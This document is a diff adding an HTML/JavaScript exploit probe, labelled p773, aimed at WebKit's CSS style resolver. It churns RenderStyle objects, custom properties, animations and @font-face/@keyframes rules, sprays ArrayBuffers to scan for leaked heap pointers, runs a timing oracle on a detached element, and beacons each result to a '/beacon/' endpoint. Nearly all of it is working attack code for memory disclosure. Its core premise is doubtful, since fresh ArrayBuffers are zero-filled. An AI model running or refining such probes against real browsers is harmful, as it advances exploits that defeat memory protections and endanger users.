@@ -1,0 +1,387 @@
+<!--
+  p773: CSS ComputedStyle / StyleResolver internal buffer residue oracle
+
+  getComputedStyle() triggers style resolution in WebCore's CSS engine,
+  which allocates RenderStyle objects (~200-400 bytes) containing all
+  computed CSS property values. These objects live in WebCore's rendering
+  tree, allocated from a different pool than the JS heap.
+
+  Key insight: when DOM elements are removed, their RenderStyle objects
+  are freed. The style resolver also allocates intermediate objects
+  during cascade resolution: StyleResolver::State, CascadeLevel arrays,
+  and property value storage. These intermediates are allocated and freed
+  per-resolution, creating churn in WebCore's allocator.
+
+  Additionally: CSS custom properties (--var) store string values in
+  heap-allocated storage. Creating many custom properties and then
+  removing the elements that define them frees those string buffers.
+  If we can reclaim that memory with ArrayBuffers, the string backing
+  store might contain residual pointers from the style resolver.
+
+  CSS animations and transitions allocate AnimationTimeline and
+  KeyframeEffect objects with C++ backing. Starting and canceling
+  many animations exercises the animation subsystem allocator.
+
+  MutationObserver callbacks fire synchronously during DOM mutation,
+  giving us a precise interception point where freed style data
+  may still be in the allocator's free list.
+
+  Attack angles:
+  A) Bulk element create/style/remove then AB spray for RenderStyle residue.
+  B) CSS custom property (--var) string buffer residue after element removal.
+  C) CSS animation/transition allocator churn then spray.
+  D) getComputedStyle() on removed element timing oracle.
+  E) MutationObserver callback as free-list observation window.
+  F) CSS @font-face / @keyframes rule create/delete allocation churn.
+
+  CRASH_CLASS: LOW (DOM/CSS operations, no side effects)
+  prior art: p633 (CSS side channels dead), p612 (FontFace T-determinism),
+  p629 (Canvas2D struct mapping)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p773</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+window.onload=function(){
+b('p773-START');
+
+// === Section A: Bulk element create/style/remove then AB spray ===
+try{
+  b('A-renderstyle-residue');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    var container=document.createElement('div');
+    document.body.appendChild(container);
+
+    for(var i=0;i<200;i++){
+      var el=document.createElement('div');
+      el.style.cssText='position:absolute;left:'+(i*2)+'px;top:'+(i*3)+'px;'+
+        'width:'+(50+i)+'px;height:'+(30+i)+'px;'+
+        'color:rgb('+(i&255)+','+(i*3&255)+','+(i*7&255)+');'+
+        'background:rgb('+(i*11&255)+','+(i*13&255)+','+(i*17&255)+');'+
+        'font-size:'+(10+i%20)+'px;line-height:'+(1.2+i*0.01)+';'+
+        'margin:'+(i%10)+'px;padding:'+(i%8)+'px;'+
+        'border:'+((i%5)+1)+'px solid rgb('+(i*19&255)+',0,0);'+
+        'opacity:'+(0.5+i*0.002)+';transform:rotate('+(i%360)+'deg);'+
+        'box-shadow:'+(i%3)+'px '+(i%4)+'px '+(i%5)+'px rgba(0,0,0,0.'+i%10+');'+
+        'text-transform:uppercase;letter-spacing:'+(i%5)+'px;';
+      el.textContent='styled_element_'+round+'_'+i;
+      container.appendChild(el);
+    }
+
+    void container.offsetHeight;
+
+    for(var i=0;i<200;i++){
+      var child=container.children[0];
+      if(child){
+        void getComputedStyle(child).color;
+        container.removeChild(child);
+      }
+    }
+    document.body.removeChild(container);
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(128);}
+
+    var SIZES=[128,192,256,384];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('A-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      aHits+=szHits;
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: CSS custom property string buffer residue ===
+try{
+  b('B-custom-props');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    var container=document.createElement('div');
+    document.body.appendChild(container);
+
+    for(var i=0;i<100;i++){
+      var el=document.createElement('div');
+      for(var j=0;j<20;j++){
+        el.style.setProperty('--custom-var-'+j+'-'+i,
+          'value_'+round+'_'+i+'_'+j+'_'+'x'.repeat(30+j));
+      }
+      el.style.color='var(--custom-var-0-'+i+', red)';
+      el.textContent='var_element_'+i;
+      container.appendChild(el);
+    }
+
+    void container.offsetHeight;
+    if(round===0){
+      var cs=getComputedStyle(container.children[0]);
+      var v=cs.getPropertyValue('--custom-var-0-0');
+      b('B custom_prop_read='+(v?'"'+v.substring(0,40)+'"':'null'));
+    }
+
+    document.body.removeChild(container);
+    container=null;
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[64,96,128];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('B-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      bHits+=szHits;
+    }
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: CSS animation/transition allocator churn ===
+try{
+  b('C-animation-churn');
+  var cHits=0;
+
+  var style=document.createElement('style');
+  style.textContent='@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}'+
+    '@keyframes fade{0%{opacity:0}50%{opacity:1}100%{opacity:0}}'+
+    '@keyframes slide{0%{left:0}100%{left:100px}}';
+  document.head.appendChild(style);
+
+  for(var round=0;round<5;round++){
+    var container=document.createElement('div');
+    container.style.position='relative';
+    document.body.appendChild(container);
+
+    var anims=['spin 1s linear','fade 0.5s ease','slide 0.8s ease-in-out'];
+    for(var i=0;i<100;i++){
+      var el=document.createElement('div');
+      el.style.cssText='position:absolute;width:10px;height:10px;background:red;';
+      el.style.animation=anims[i%3];
+      container.appendChild(el);
+    }
+
+    void container.offsetHeight;
+
+    for(var i=0;i<100;i++){
+      var child=container.children[0];
+      if(child){
+        child.style.animation='none';
+        container.removeChild(child);
+      }
+    }
+    document.body.removeChild(container);
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+    var szHits=0;
+    for(var i=0;i<300;i++){
+      var ab=new ArrayBuffer(192);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=192;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=3)b('C-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    cHits+=szHits;
+  }
+  document.head.removeChild(style);
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: getComputedStyle on removed element timing ===
+try{
+  b('D-removed-timing');
+
+  var el=document.createElement('div');
+  el.style.cssText='width:100px;height:50px;background:blue;font-size:16px;';
+  el.textContent='timing_test';
+  document.body.appendChild(el);
+  void el.offsetHeight;
+
+  var attachedTimes=[];
+  for(var trial=0;trial<50;trial++){
+    var t0=performance.now();
+    for(var i=0;i<1000;i++){
+      void getComputedStyle(el).width;
+      void getComputedStyle(el).height;
+      void getComputedStyle(el).fontSize;
+    }
+    attachedTimes.push(performance.now()-t0);
+  }
+
+  document.body.removeChild(el);
+
+  var detachedTimes=[];
+  for(var trial=0;trial<50;trial++){
+    var t0=performance.now();
+    for(var i=0;i<1000;i++){
+      void getComputedStyle(el).width;
+      void getComputedStyle(el).height;
+      void getComputedStyle(el).fontSize;
+    }
+    detachedTimes.push(performance.now()-t0);
+  }
+
+  function stats(arr){
+    var mn=arr[0],mx=arr[0],sum=0;
+    for(var i=0;i<arr.length;i++){
+      if(arr[i]<mn)mn=arr[i];
+      if(arr[i]>mx)mx=arr[i];
+      sum+=arr[i];
+    }
+    return {min:mn.toFixed(2),max:mx.toFixed(2),avg:(sum/arr.length).toFixed(2)};
+  }
+
+  var sa=stats(attachedTimes);
+  var sd=stats(detachedTimes);
+  b('D attached min='+sa.min+' max='+sa.max+' avg='+sa.avg+'ms');
+  b('D detached min='+sd.min+' max='+sd.max+' avg='+sd.avg+'ms');
+  b('D ratio='+(parseFloat(sd.avg)/Math.max(0.01,parseFloat(sa.avg))).toFixed(2));
+  b('D-DONE');
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: MutationObserver callback as free-list window ===
+try{
+  b('E-mutationobserver');
+  var eHits=0;
+
+  var container=document.createElement('div');
+  document.body.appendChild(container);
+
+  var observedMutations=0;
+  var sprayInCallback=false;
+
+  var observer=new MutationObserver(function(mutations){
+    observedMutations+=mutations.length;
+
+    if(sprayInCallback){
+      for(var i=0;i<500;i++){var tmp=new ArrayBuffer(128);}
+
+      for(var i=0;i<100;i++){
+        var ab=new ArrayBuffer(192);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=192;off+=8){
+          if(isPtr(dv,off)){
+            eHits++;
+            if(eHits<=3)b('E-PTR-INCB i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+    }
+  });
+
+  observer.observe(container,{childList:true,subtree:true,attributes:true});
+
+  for(var i=0;i<50;i++){
+    var el=document.createElement('div');
+    el.style.cssText='width:'+i+'px;height:'+i+'px;background:green;';
+    el.textContent='observed_'+i;
+    container.appendChild(el);
+  }
+
+  void container.offsetHeight;
+
+  sprayInCallback=true;
+  for(var i=container.children.length-1;i>=0;i--){
+    container.removeChild(container.children[i]);
+  }
+
+  observer.disconnect();
+  b('E mutations_observed='+observedMutations);
+
+  for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+  for(var i=0;i<200;i++){
+    var ab=new ArrayBuffer(128);
+    var dv=new DataView(ab);
+    for(var off=0;off+8<=128;off+=8){
+      if(isPtr(dv,off)){
+        eHits++;
+        if(eHits<=5)b('E-PTR-POST i='+i+' off='+off+' val='+hex64(dv,off));
+      }
+    }
+  }
+
+  document.body.removeChild(container);
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: @font-face / @keyframes rule create/delete churn ===
+try{
+  b('F-atrule-churn');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    var style=document.createElement('style');
+    var rules='';
+    for(var i=0;i<50;i++){
+      rules+='@font-face{font-family:"TestFont'+round+'_'+i+'";src:local("Arial");'+
+        'font-weight:'+(100+i*100%900)+';font-style:normal;'+
+        'unicode-range:U+00-FF;}\n';
+      rules+='@keyframes anim'+round+'_'+i+'{'+
+        '0%{opacity:'+(i*0.01)+';transform:scale('+(1+i*0.01)+')}'+
+        '50%{opacity:'+(0.5+i*0.005)+';transform:scale('+(1.5+i*0.01)+')}'+
+        '100%{opacity:1;transform:scale(1)}}\n';
+    }
+    style.textContent=rules;
+    document.head.appendChild(style);
+
+    void document.body.offsetHeight;
+
+    document.head.removeChild(style);
+    style=null;
+
+    for(var i=0;i<2000;i++){var tmp=new ArrayBuffer(96);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(128);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=128;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('F-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    fHits+=szHits;
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p773-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
